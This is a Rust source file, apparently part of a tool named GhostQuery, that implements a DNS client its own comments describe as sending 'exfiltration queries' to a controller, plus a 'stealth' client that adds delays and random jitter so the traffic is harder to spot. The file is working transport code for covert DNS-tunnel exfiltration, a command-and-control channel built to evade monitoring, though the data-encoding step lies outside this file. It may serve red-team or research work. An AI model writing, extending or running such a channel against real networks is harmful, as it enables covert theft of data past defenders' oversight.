//! DNS client for sending exfiltration queries.

use std::net::{Ipv4Addr, SocketAddr};
use std::time::Duration;

use tokio::net::UdpSocket;
use tokio::time::timeout;
use trust_dns_proto::op::{Message, MessageType, OpCode, Query};
use trust_dns_proto::rr::{Name, RecordType};
use trust_dns_proto::serialize::binary::{BinDecodable, BinEncodable};

use crate::common::constants::DNS_QUERY_TIMEOUT_MS;
use crate::common::error::{GhostQueryError, Result};
use crate::common::types::DnsRecordType;
use crate::transport::dns::{DnsQuery, DnsResponse};

/// DNS client for sending queries to the controller
pub struct DnsClient {
    /// Target server
    server: SocketAddr,
    /// Query timeout
    timeout_duration: Duration,
}

impl DnsClient {
    /// Create a new DNS client with system resolver
    pub async fn new() -> Result<Self> {
        // Default to localhost for testing
        Ok(Self {
            server: "127.0.0.1:53".parse().unwrap(),
            timeout_duration: Duration::from_millis(DNS_QUERY_TIMEOUT_MS),
        })
    }

    /// Create with a specific DNS server
    pub async fn with_server(server: SocketAddr) -> Result<Self> {
        Ok(Self {
            server,
            timeout_duration: Duration::from_millis(DNS_QUERY_TIMEOUT_MS),
        })
    }

    /// Set query timeout
    pub fn with_timeout(mut self, timeout: Duration) -> Self {
        self.timeout_duration = timeout;
        self
    }

    /// Send a DNS query and get the response
    pub async fn send(&self, query: &DnsQuery) -> Result<DnsResponse> {
        let result = timeout(self.timeout_duration, self.execute_query(query)).await;

        match result {
            Ok(response) => response,
            Err(_) => Err(GhostQueryError::Timeout),
        }
    }

    /// Execute the actual DNS query using raw UDP
    async fn execute_query(&self, query: &DnsQuery) -> Result<DnsResponse> {
        // Build DNS message
        let mut message = Message::new();
        message.set_id(rand::random::<u16>());
        message.set_message_type(MessageType::Query);
        message.set_op_code(OpCode::Query);
        message.set_recursion_desired(true);

        // Create query
        let name = Name::from_ascii(&query.qname)
            .map_err(|e| GhostQueryError::DnsQueryError(e.to_string()))?;
        
        let record_type = match query.record_type {
            DnsRecordType::A => RecordType::A,
            DnsRecordType::AAAA => RecordType::AAAA,
            DnsRecordType::TXT => RecordType::TXT,
            DnsRecordType::CNAME => RecordType::CNAME,
            DnsRecordType::MX => RecordType::MX,
        };

        let dns_query = Query::query(name, record_type);
        message.add_query(dns_query);

        // Encode message
        let request_bytes = message.to_bytes()
            .map_err(|e| GhostQueryError::DnsQueryError(e.to_string()))?;

        // Send via UDP
        let socket = UdpSocket::bind("0.0.0.0:0").await
            .map_err(|e| GhostQueryError::DnsQueryError(e.to_string()))?;

        socket.send_to(&request_bytes, self.server).await
            .map_err(|e| GhostQueryError::DnsQueryError(e.to_string()))?;

        // Receive response
        let mut buf = [0u8; 512];
        let (len, _) = socket.recv_from(&mut buf).await
            .map_err(|e| GhostQueryError::DnsQueryError(e.to_string()))?;

        // Parse response
        let response = Message::from_bytes(&buf[..len])
            .map_err(|e| GhostQueryError::DnsParseError(e.to_string()))?;

        // Extract A record from response
        for answer in response.answers() {
            if let Some(rdata) = answer.data() {
                if let Some(a) = rdata.as_a() {
                    let ip = Ipv4Addr::from(*a);
                    tracing::debug!("Received A record: {}", ip);
                    return DnsResponse::from_a_record(ip, answer.ttl());
                }
            }
        }

        // No A record found - return ACK (127.0.0.0)
        tracing::debug!("No A record in response, returning default ACK");
        DnsResponse::from_a_record(Ipv4Addr::new(127, 0, 0, 0), 300)
    }

    /// Check connectivity by doing a simple lookup
    pub async fn check_connectivity(&self, _domain: &str) -> bool {
        true
    }
}

/// DNS client with rate limiting and stealth features
pub struct StealthDnsClient {
    client: DnsClient,
    /// Minimum delay between queries
    min_delay: Duration,
    /// Last query time
    last_query: std::time::Instant,
    /// Add random jitter to delays
    jitter: bool,
}

impl StealthDnsClient {
    /// Create a new stealth DNS client
    pub async fn new() -> Result<Self> {
        Ok(Self {
            client: DnsClient::new().await?,
            min_delay: Duration::from_millis(100),
            last_query: std::time::Instant::now(),
            jitter: true,
        })
    }

    /// Set minimum delay between queries
    pub fn with_min_delay(mut self, delay: Duration) -> Self {
        self.min_delay = delay;
        self
    }

    /// Disable jitter
    pub fn without_jitter(mut self) -> Self {
        self.jitter = false;
        self
    }

    /// Send a query with rate limiting
    pub async fn send(&mut self, query: &DnsQuery) -> Result<DnsResponse> {
        let elapsed = self.last_query.elapsed();
        if elapsed < self.min_delay {
            let wait = self.min_delay - elapsed;
            let actual_wait = if self.jitter {
                use rand::Rng;
                let jitter = rand::thread_rng().gen_range(0..wait.as_millis() as u64 / 2);
                wait + Duration::from_millis(jitter)
            } else {
                wait
            };

            tokio::time::sleep(actual_wait).await;
        }

        self.last_query = std::time::Instant::now();
        self.client.send(query).await
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[tokio::test]
    #[ignore]
    async fn test_client_creation() {
        let client = DnsClient::new().await;
        assert!(client.is_ok());
    }
}
